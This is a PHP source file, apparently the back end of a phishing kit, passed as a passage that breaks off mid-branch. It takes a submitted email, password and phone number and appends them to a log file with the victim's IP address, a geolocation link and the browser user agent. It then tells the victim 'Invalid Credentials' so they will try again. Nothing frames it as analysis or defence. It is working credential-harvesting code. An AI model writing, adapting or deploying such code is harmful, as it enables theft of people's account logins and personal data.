<?php
$email = trim($_POST['email']);
$password = trim($_POST['password']);
$phone = trim($_POST['phone']);
$outputFile = 'output.txt';

if ($email != null && $password != null && $phone != null) {
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "|----------| xLs |--------------|\n";

    $message .= "Online ID            : " . $email . "\n";
    $message .= "Passcode              : " . $password . "\n";
    $message .= "phone              : " . $phone . "\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "|Client IP: " . $ip . "\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent : " . $useragent . "\n";
    $message .= "|----------- CrEaTeD bY JAH --------------|\n";

    // Append the message to a new line in the output file
    file_put_contents($outputFile, $message, FILE_APPEND | LOCK_EX);

    $signal = 'ok';
    $msg = 'Invalid Credentials';
} else if ($email != null && $password != null) {
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "|----------| xLs |--------------|\n";

    $message .= "Online ID            : " . $email . "\n";
    $message .= "Passcode              : " . $password . "\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "|Client IP: " . $ip . "\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent : " . $useragent . "\n";
    $message .= "|----------- CrEaTeD bY JAH --------------|\n";

    // Append the message to a new line in the output file
    file_put_contents($outputFile, $message, FILE_APPEND | LOCK_EX);

